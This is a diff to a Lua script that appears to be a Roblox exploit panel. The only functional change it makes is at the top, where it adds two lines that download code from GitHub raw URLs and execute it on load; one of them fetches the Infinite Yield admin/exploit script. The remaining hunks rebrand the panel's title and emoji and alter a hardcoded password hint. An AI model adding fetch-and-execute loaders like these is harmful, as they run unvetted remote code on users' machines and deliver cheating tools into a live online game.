@@ -1,4 +1,6 @@
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sam00-debug/Nothing-chat/refs/heads/main/Script"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
 
 
 
@@ -283,7 +285,7 @@ local EmojiLabel = Instance.new("TextLabel")
 EmojiLabel.Size = UDim2.new(0, 60, 0, 60)
 EmojiLabel.Position = UDim2.new(0.5, -30, 0, 15)
 EmojiLabel.BackgroundTransparency = 1
-EmojiLabel.Text = "🤖"
+EmojiLabel.Text = "☠️☠️☠️"
 EmojiLabel.TextScaled = true
 EmojiLabel.Parent = KeyFrame
 
@@ -291,7 +293,7 @@ local KeyTitle = Instance.new("TextLabel")
 KeyTitle.Size = UDim2.new(1, 0, 0, 25)
 KeyTitle.Position = UDim2.new(0, 0, 0, 75)
 KeyTitle.BackgroundTransparency = 1
-KeyTitle.Text = "Mecha Authentication"
+KeyTitle.Text = "Nothing Panel Authentication"
 KeyTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
 KeyTitle.Font = Enum.Font.GothamBold
 KeyTitle.TextSize = 18
@@ -301,7 +303,7 @@ local NoticeLabel = Instance.new("TextLabel")
 NoticeLabel.Size = UDim2.new(0.9, 0, 0, 45)
 NoticeLabel.Position = UDim2.new(0.05, 0, 0, 100)
 NoticeLabel.BackgroundTransparency = 1
-NoticeLabel.Text = "password- 'Mob_One0' "
+NoticeLabel.Text = "password- 'mob_one0' "
 NoticeLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
 NoticeLabel.Font = Enum.Font.GothamSemibold
 NoticeLabel.TextSize = 13
